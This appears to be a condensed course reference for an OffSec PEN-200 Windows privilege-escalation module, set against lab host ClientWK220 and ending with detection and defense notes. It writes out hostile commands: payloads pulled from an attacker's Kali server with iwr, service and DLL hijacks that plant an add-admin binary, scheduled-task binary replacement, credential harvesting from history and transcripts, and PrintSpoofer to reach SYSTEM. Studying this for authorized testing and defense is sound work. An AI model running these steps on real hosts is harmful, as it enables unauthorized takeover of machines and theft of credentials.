PEN-200 Module — Windows Privilege Escalation (WPE): from unprivileged shell to SYSTEM

Fuente: material del curso correspondiente (sin video público)

Distilled from OffSec PEN-200 (OSCP) course material (module: Windows Privilege Escalation, instructor videos WPE_01_02–WPE_03_02) — internal training reference, not for redistribution.

Objective

Obtain code execution on a Windows host as an unprivileged user (client-side attack or service exploit), then walk the full local privilege-escalation ladder against the lab host ClientWK220:

  1. Situational awareness — manual enumeration of users, groups, OS, network, apps, processes.
  2. Sensitive information — plaintext files, config files, PSReadLine history, PowerShell transcripts.
  3. Automated enumeration — winPEAS, and where it fails.
  4. Windows services abuse — service binary hijacking, DLL hijacking (missing DLL + search order), unquoted service paths.
  5. Scheduled tasks — replacing the binary referenced in a task action.
  6. Exploits & privilege abuse — application vulns, kernel exploits (with RoE caveats), and SeImpersonatePrivilege abuse via PrintSpoofer to reach NT AUTHORITY\SYSTEM.

Throughout, two principles are hammered: enumeration is cyclical (new user = restart the search) and never blindly trust automated tool output (winPEAS misidentifies the OS and misses the key artifacts; PowerUp's abuse function fails on a technicality).

Target surface

  • Lab host: ClientWK220 — 64-bit Windows 11 Pro (build 22000 / 21H2). A client workstation, not a server.
  • Attacker: Kali, connected initially via a bind shell on port 4444 (obtained earlier through a client-side attack), later via RDP (after gaining Steve's credentials) and evil-winrm over WinRM (as daveadmin).
  • Users on the host: dave (initial foothold, Help Desk group, Remote Desktop Users), steve (Remote Desktop Users), daveadmin (local Administrator, member of custom group Admin Team — admins of all workstations on the second floor), backupadmin (local Administrator), plus disabled built-in Administrator.
  • Applications: KeePass, 7-Zip, XAMPP (Apache on 80/443, MySQL on 3306, both started via XAMPP Control), RDP on 3389, bind shell on 4444.
  • Transcript note: the ASR output contains no lab IP addresses — all commands are shown as command-shape; substitute the actual lab IP when running. Recovered plaintext passwords from the lab are shown as [REDACTED].

Techniques

1. Situational awareness (manual enumeration) — WPE_01_02

After any foothold, before touching privilege escalation, collect: username/hostname, group memberships, users & groups, OS version/arch, network info, installed applications, running processes. From the bind shell as dave:

whoami                        :: user dave, hostname clientwk220 (WK = client workstation)
whoami /groups                :: Help Desk, BUILTIN\Remote Desktop Users, Everyone, BUILTIN\Users
net user                      :: or Get-LocalUser in PowerShell
Get-LocalUser                 :: Administrator (disabled), steve, dave, daveadmin, backupadmin
net localgroup                :: or Get-LocalGroup
Get-LocalGroupMember "Admin Team"          :: daveadmin only — NOT in local Administrators
Get-LocalGroupMember Administrators        :: daveadmin, backupadmin (Administrator is disabled)

Key readings: daveadmin is almost certainly dave's privileged account (admins pair a day-to-day account with a privileged one); custom groups whose names contain admin/backup (Admin Team, Backup Users) and built-ins Backup Operators (backup/restore all files regardless of ACL), Remote Desktop Users (RDP), Remote Management Users (WinRM) are prime targets — GUI access via RDP dramatically widens options.

systeminfo                    :: Windows 11 Pro, build 22000 → 21H2; 64-bit (matters for cross-compiling binaries)
ipconfig /all                 :: static IP, DNS, gateway, subnet mask, MAC
route print                   :: routing table — check for routes into previously unknown networks
netstat -nao                  :: listening/active TCP+UDP, no name resolution, with PIDs
Get-Process                   :: map PIDs to processes (mysqld = 3116, httpd = 2996, XAMPP Control ⇒ both via XAMPP)

netstat shows 80/443 (web), 3306 (MySQL), 4444 (our shell) — and 3389 with an active RDP session: another user is connected; once elevated, Mimikatz could harvest their credentials.

Installed applications via the two registry Uninstall keys (32- and 64-bit), then cross-check on disk and in the user's Downloads:

Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName   # 64-bit
Get-ItemProperty HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName  # 32-bit

Finds KeePass, 7-Zip, XAMPP → feed later phases (public exploits, password-attacks on the password manager).

2. Sensitive information in plain sight — WPE_01_03

The modern post-it note is a text file on the desktop. Guided by the situational-awareness picture, hunt for the artifacts of the apps you found:

Get-ChildItem -Path C:\ -Include *.kdbx -Recurse -ErrorAction SilentlyContinue   # KeePass databases — none found here
Get-ChildItem -Path C:\xampp\ -Include *.txt,*.ini -Recurse                      # XAMPP configs
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.ini -Recurse                 # user docs/notes

Results: C:\xampp\passwords.txt (only unmodified XAMPP defaults — dead end); C:\xampp\mysql\bin\my.ini — permission denied as dave; C:\Users\dave\Desktop\asdf.txt — meeting notes stating the web app uses local-user credentials and that, for testing, Steve's password can be used ([REDACTED]).

Credential-reuse workflow: check what the new identity unlocks before using it.

net user steve               :: not in Administrators, but IS in Remote Desktop Users

RDP in as steve — and the search restarts from zero: different user, different file permissions. This is the cyclical nature of pentesting. As Steve, my.ini is readable: it contains the manually set MySQL password — with a comment saying it is also the Windows password for backupadmin ([REDACTED]).

net user backupadmin         :: NOT in Remote Desktop Users / Remote Management Users → no RDP, no WinRM

Access paths when the target user isn't in those groups: - runas — needs a GUI (the password prompt doesn't accept input in bind shells / WinRM); works for local or domain accounts that may log on locally:

powershell runas /user:ClientWK220\backupadmin cmd.exe # enter the password at the prompt - WinRM / RDP if the user is in the corresponding group. - Scheduled task, if the user holds Logon as a batch job. - PsExec (Sysinternals) if the user has an active session.

Result: dave → steve → backupadmin (local admin), with zero exploits. And: passwords found in config/text files should be retried against all users and services — reuse is everywhere.

3. Information goldmine: PowerShell artifacts — WPE_01_04

Two increasingly common defensive logging mechanisms double as attacker gold:

  • PowerShell transcription ("over-the-shoulder" logging) — transcript files in user home dirs, a central directory, or a network share.
  • Script block logging — events record the full text of executed code, including encoded commands' original representation.

Always check history first:

Get-History                                  # empty — but only clears PowerShell's own history...
(Get-PSReadlineOption).HistorySavePath       # ...PSReadLine keeps a file. Read it:
Get-Content (Get-PSReadlineOption).HistorySavePath

Clear-History does not clear the PSReadLine history file — admins who rely on it leave everything behind. The recovered history shows:

  • Register-SecretVault with module SecretManagement.KeePass → a KeePass database exists somewhere.
  • Set-Secret -Name server02adminpw -Password <[REDACTED]> → credentials for another system; try the password against every local user/service anyway.
  • Clear-History (the admin's mistake).
  • Start-Transcript -Path C:\Users\Public\... → where the transcript lives.
  • Enter-PSSession -ComputerName clientwk220 -Credential $cred → the $cred construction is not in history, so the username/password are unknown from history alone.

The transcript file (started before the Enter-PSSession) fills the gap: it captured the three commands that build the PSCredential — ConvertTo-SecureString for the password, then New-Object System.Management.Automation.PSCredential with the username — revealing daveadmin's password ([REDACTED]).

Re-running those three commands inside the bind shell to open a WinRM remoting session works for whoami but then hangs — a known flakiness of remoting sessions inside a bind shell. Switch to evil-winrm from Kali instead:

evil-winrm -i <clientwk220-ip> -u daveadmin -p '<[REDACTED]>'   # escape special chars (e.g. "!") in the shell

Defensive notes for the same section: admins can disable PSReadLine recording with Set-PSReadlineOption -HistorySaveStyle SaveNothing, or clear the history file manually — Clear-History alone is insufficient.

4. Automated enumeration: winPEAS — WPE_01_05

For time-boxed engagements, automate the sweep. Kali ships winPEAS; serve it and pull it onto the target:

# Kali: python3 -m http.server 80 (in the dir holding the 64-bit binary)
iwr -uri http://<kali-ip>/winPEASx64.exe -outfile winPEASx64.exe
.\winPEASx64.exe        # takes a few minutes; red = worth deeper inspection, green = security protections in place

Output covers system info, security protections, PowerShell/NTLM settings, transcript files, users+groups, processes, services, scheduled tasks, network, installed apps, and candidate password files.

The lesson of the video is what it gets wrong: it reports the target as Windows 10 Pro (it's Windows 11); the transcript-file list is empty (one exists in C:\Users\Public); the password-file list omits asdf.txt; PowerShell history isn't surfaced. Every finding that elevated privileges in sections 2–3 was missed. Conclusion is not to skip automation — on real assessments with thousands of files it is indispensable — but to treat it as a floor, not a ceiling.

5. Service binary hijacking — WPE_02_01

Scenario: a developer installs an app as a service but leaves the binary world-writable by Users. Replacing it yields execution at the service's privileges (often LOCAL SYSTEM) on restart/reboot.

Enumerate services (GUI services.msc, Get-Service, or preferred):

Get-CimInstance -ClassName Win32_Service | Select-Object Name, State, PathName | Where-Object { $_.State -eq 'Running' }

The XAMPP services (Apache2.4, mysql) stand out: binaries under C:\xampp\, not C:\Windows\System32 → user-installed, developer-controlled permissions → candidates. Check ACLs with icacls (works in both cmd and PowerShell):

icacls C:\xampp\apache\bin\httpd.exe    # BUILTIN\Users: RX → cannot replace
icacls C:\xampp\mysql\bin\mysqld.exe    # BUILTIN\Users: F  → full access, and NOT inherited (no "(I)")

(F = full; absence of (I) means the permission was set deliberately. Admins habitually grant full access "to avoid permission problems" — that's the bug.)

Build the payload — small C program calling system() to run net user dave2 ... /add + net localgroup administrators dave2 /add — and cross-compile on Kali with mingw-w64 as a 64-bit EXE (architecture matters):

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe    # exact invocation per the Fixing Exploits topic

Deploy, keeping the original for cleanup:

iwr -uri http://<kali-ip>/adduser.exe -outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe $HOME\mysqld.exe.bak
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
net stop mysql          # fails — dave can't manage services (expected)

No restart permission → try reboot: the service's StartMode must be Auto.

Get-CimInstance -ClassName Win32_Service | Where-Object { $_.Name -like '*mysql*' } | Select-Object Name, StartMode   # Auto
whoami /priv        # SeShutdownPrivilege present (Disabled merely means not enabled in *this* process token)
shutdown /r /t 0

After reboot: Get-LocalGroupMember Administrators shows dave2 → use runas for an interactive shell (or msfvenom a reverse-shell binary instead). Cleanup: delete the planted binary, restore the backup, reboot.

Automation cross-check with PowerUp.ps1 (download with iwr, then powershell -ExecutionPolicy Bypass and import):

. .\PowerUp.ps1
Get-ModifiableServiceFile    # flags mysql + abuse function Install-ServiceBinary
Install-ServiceBinary -ServiceName mysql    # ERROR: "service binary file is not modifiable by the current user"

Root cause: Get-ModifiablePath returns empty for the mysql service because its PathName embeds the --defaults-file argument, which breaks the parser — yet manual replacement demonstrably worked. Moral, twice repeated: automated tool output is a lead generator; when an abuse function errors, determine whether the vector is real before discarding it.

6. Service DLL hijacking (missing DLL) — WPE_02_02

When service binaries aren't writable, aim at their DLLs. Two angles: overwrite a DLL the service loads (service may malfunction, but code still executes), or exploit the DLL search order when a binary requests a DLL that doesn't exist.

Search order (Safe DLL Search Mode enabled by default on all current Windows): ① application directory, ② System32, ③ 16-bit system dir, ④ Windows dir, ⑤ current directory, ⑥ PATH. Disabling SafeDllSearchMode promotes current-directory to position ②. A missing DLL typically stems from a flawed install or update — the app usually still runs with reduced functionality, and the first directory in the order that contains a file with that name wins.

Example: service BetaService, binary not replaceable (RX only as steve). Enumeration of loaded DLLs needs Process Monitor, which requires admin — the standard procedure is to copy the service binary to your own machine, install it locally, and run ProcMon there. Here it's simulated by running C:\Tools\ProcMon\ProcMon64.exe as backupadmin (Run as administrator, enter the password).

ProcMon workflow:

  1. Filter → Filter: ProcessName is BetaService.exe Include (unfiltered, thousands of events per second).
  2. Restart-Service BetaService → the binary attempts to load its DLLs.
  3. CreateFile operations with result NAME NOT FOUND for mydll.dll, retried across every search-order directory in sequence.
$env:Path          # confirm the later CreateFile paths == PATH entries

The first attempted location is the application directory — which, in this lab setup, is Steve's Documents folder → we can write there. Plant the payload: a C++ DLL whose DllMain adds the payload to the DLL_PROCESS_ATTACH case (executed when a process loads the DLL; the other three switch cases handle process/thread attach/detach). Reuse the adduser code, adding #include <windows.h> for the Win32 types:

x86_64-w64-mingw32-gcc mydll.cpp -o mydll.dll -shared    # build a DLL, not an EXE

cd $HOME\Documents
iwr -uri http://<kali-ip>/mydll.dll -outfile mydll.dll
net user dave2          # confirm it doesn't exist yet
Restart-Service BetaService
net user dave2          # created; net localgroup Administrators confirms membership

7. Unquoted service paths — WPE_02_03

Applies when the service path contains spaces, is unquoted, and we can write to one of the derived candidate directories (even without permission to modify any file inside them). On service start, CreateProcess's lpApplicationName parsing walks the path left to right: at every space it treats the preceding chunk (plus .exe) as the executable and the remainder as arguments, trying each interpretation in turn. A malicious binary named after any early interpretation executes at the service's privileges.

Example path (ASR does not reproduce it verbatim — reconstructed shape): C:\Program Files\Enterprise Apps\gamma serve\gammaServe.exe → Windows tries, in order: C:\Program.exe, C:\Program Files\Enterprise.exe, C:\Program Files\Enterprise Apps\gamma.exe, then the real binary. The first two need write access standard users lack; the third — the app's own directory — is the realistic one if the developer/admin loosened its ACL.

Enumeration — find unquoted paths outside the Windows directory. Using cmd.exe (not PowerShell) avoids quote-escaping pain; Select-String is the PS alternative:

wmic service get name,pathname | findstr /i /v c:\windows | findstr /v "\""

Finds the stopped GammaService. Then:

Start-Service GammaService ; Stop-Service GammaService    # we CAN restart it ourselves — no reboot needed
icacls "C:\" ; icacls "C:\Program Files\"                  # Users/Authenticated Users: no write
icacls "C:\Program Files\Enterprise Apps"                  # BUILTIN\Users: WRITE ← target directory

(Skip the 4th candidate path — that's the service binary itself.)

cd 'C:\Program Files\Enterprise Apps'
iwr -uri http://<kali-ip>/adduser.exe -outfile current.exe   # named for the parsed filename
Start-Service GammaService

Expected quirk: Windows reports the service failed to start — the payload ignores the leftover "arguments" — but net user dave2 and net localgroup administrators confirm it ran anyway. Cleanup: stop the service, delete current.exe; the original binary runs again on next start.

PowerUp reproduces the whole chain automatically:

Get-UnquotedService                 # flags GammaService
Write-ServiceBinary -Name GammaService -Path 'C:\Program Files\Enterprise Apps\current.exe'   # abuse function
# default behavior: creates local admin user john / password123! ; then restart the service

Requires a specific combination of conditions (spaces + missing quotes + writable candidate directory), but is trivial to exploit when they align.

8. Scheduled tasks — WPE_03_01

Same replace-the-binary idea, applied to tasks. Enumerate with Get-ScheduledTask or:

schtasks /query /fo LIST /v

Scan the flood of output for: Author, Task Name, Task To Run, Run As User, Next Run Time — fields that answer: who runs it, what it runs, when it runs, as whom.

Hit: task "Microsoft Cache Cleanup" — Author daveadmin, action runs backend-cache-cleanup.exe from Steve's Pictures directory, every minute (last/next run times), as daveadmin. Because the executable sits in Steve's home tree, permissions are ours:

icacls C:\Users\steve\Pictures\backend-cache-cleanup.exe     # F — full access

iwr -uri http://<kali-ip>/adduser.exe -outfile backend-cache-cleanup.exe   # keep a copy of the original first

Wait a minute (per-run interval), then net user dave2 / net localgroup administrators confirm the new admin. Cleanup: restore the original executable.

9. Exploits & privilege abuse — WPE_03_02

Three families of exploit-based escalation:

  1. Application vulnerabilities — an installed app running with administrative rights; exploit code-execution in it → its privileges. (Same public-exploit workflow as the Locating Public Exploits topic.)
  2. Windows kernel exploits — powerful but advanced, and prone to crashing the host. Check rules of engagement / exclusions / boundaries first; a disruptive BSOD may be out of scope.
  3. Abusing Windows privileges — a non-admin user holding certain rights, notably SeImpersonatePrivilege: the ability to adopt the security context of a client connecting to it. By default assigned to local Administrators and to LOCAL SERVICE, NETWORK SERVICE, and service accounts. Standard users rarely have it — but web/IIS footholds almost always do, since IIS app-pool identities and most service accounts carry it.

The mechanism behind the privilege: named pipes (Windows IPC — a pipe server creates a named pipe, a client connects by name, possibly cross-machine). A pipe server holding SeImpersonatePrivilege can impersonate the client after capturing its authentication. Abuse = coerce a privileged process into connecting to a pipe we control, then act in its security context.

Example with PrintSpoofer (variant of the printer bug, coercing NT AUTHORITY\SYSTEM onto a controlled pipe):

whoami /priv                    :: dave has SeImpersonatePrivilege
:: Kali: download PrintSpoofer64.exe, serve over HTTP
iwr -uri http://<kali-ip>/PrintSpoofer64.exe -outfile PrintSpoofer64.exe
PrintSpoofer64.exe -i -c powershell.exe     # -i = interact with the process in this console; -c = command
whoami                          :: nt authority\system

Alternatives worth studying: the potato family (Juicy/Sharp/Rogue/etc.) — same privilege, different coercion primitives.

Detection & defense

  • Situational awareness commands (whoami /priv, net user, registry Uninstall queries, netstat) are native and indistinguishable from admin activity in small numbers — correlate with logon sessions (a fresh interactive/session connection followed by rapid sequential enumeration) and EDR process lineage.
  • Plaintext secrets are unfixable by monitoring: enforce secret managers, forbid passwords in meeting notes/config comments, and remove world-readable config files (my.ini readable by a mere RDP user is the root of the whole chain). The XAMPP passwords.txt should not survive first boot.
  • PowerShell logging cuts both ways: transcription and script-block logging are the defense's source of truth and the attacker's treasure trove. Protect transcript locations (the lab transcript sat in world-readable C:\Users\Public), and treat PSReadLine history (%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt) as sensitive — Clear-History does not touch it; either Set-PSReadlineOption -HistorySaveStyle SaveNothing or delete the file.
  • Service ACLs: no user-writable service binaries (Users: F on mysqld.exe is the textbook grant-to-avoid-permission-tickets mistake); secure the service's own install directory too — the DLL hijack needed only a writable application directory, and the unquoted-path hijack only a writable parent. Quote every service path containing spaces. Audit with the same tooling attackers use (PowerUp's Get-ModifiableServiceFile / Get-UnquotedService).
  • ProcMon-on-target pattern: an admin-run Process Monitor session planted by an attacker mirrors the legitimate troubleshooting workflow — restrict who can run as administrator and monitor Sysmon process creation with elevated tokens.
  • Scheduled tasks: tasks created by privileged accounts must never point at executables inside standard-user-writable directories; watch (Sysmon Event ID 1 / 4698-4699) for task creation/modification by non-admins and for privileged tasks executing from user profiles.
  • Reboot as restart primitive: SeShutdownPrivilege on a standard user (as dave had) turns any planted binary into a guaranteed execution event at next boot — revoke it from standard users where not needed.
  • SeImpersonatePrivilege footholds: it is inherent to service accounts, so the real defense is containment — service isolation, patched OS (the printer-bug coercions have hardening fixes), and egress/pipe controls; alert on unusual local named-pipe connection patterns from service contexts.
  • Kernel exploits: monitoring helps little once run; the defense posture is patch discipline plus contractual protection — explicit RoE language about system-crashing techniques.
  • Cross-cutting: every escalation here ended with the same payload (create dave2, add to Administrators). Blue teams should alert on exactly that shape: new local account creation followed by local-group modification (4688/4720/4732) from a single session.
